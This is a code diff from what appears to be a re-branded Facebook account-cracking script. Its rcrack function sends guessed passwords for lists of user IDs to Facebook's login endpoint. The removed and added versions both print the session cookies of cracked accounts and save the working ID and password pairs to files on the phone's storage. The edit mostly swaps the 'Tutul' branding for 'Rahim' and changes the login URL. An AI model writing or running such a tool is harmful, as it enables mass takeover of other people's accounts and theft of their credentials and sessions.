@@ -238,30 +238,19 @@ def rcrack(uid,pwx,tl):
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent':'Mozilla/5.0 (Linux; Android 11; Infinix X693) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',}
-            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
-            log_cookies=session.cookies.get_dict().keys()
-            if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[7:22]
-                print('\r\r\033[1;32m[Tutul-OK💚] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
-                cek_apk(session,coki)
-                open('/sdcard/Tutul-OK.txt', 'a').write( uid+' | '+ps+'\n')
-                oks.append(cid)
-                break
-            elif 'checkpoint' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[24:39]
-                #print('\r\r\33[1;30m[Tutul-CP] ' +uid+ ' • ' +ps+           '  \33[0;97m')
-                open('/sdcard/Tutul-CP.txt', 'a').write( uid+' | '+ps+' \n')
-                cps.append(cid)
-                break
-            else:
-                continue
-        loop+=1
-        sys.stdout.write(f'\r\r%s{x}[{xr}Tutul{x}][%s\%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
-        sys.stdout.flush()
-    except:
-        pass
- 
-xxr()
- 
+            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[7:22]
+				print('\r\r \033[1;32m[Rahim-OK💉]  ' +uid+ ' | ' +ps+    '  \n \033[1;34m[COOKIE \033[1;91m[🍪] = \033[1;94m'+coki+  ' \n\033[1;95m')
+				cek_apk(session,coki)
+				open('/sdcard/Rahim-OK.txt', 'a').write(cid+' | '+ps+'\n')
+				oks.append(cid)
+				break
+			else:
+				continue
+		loop+=1
+	except:
+		pass
+ALEX()
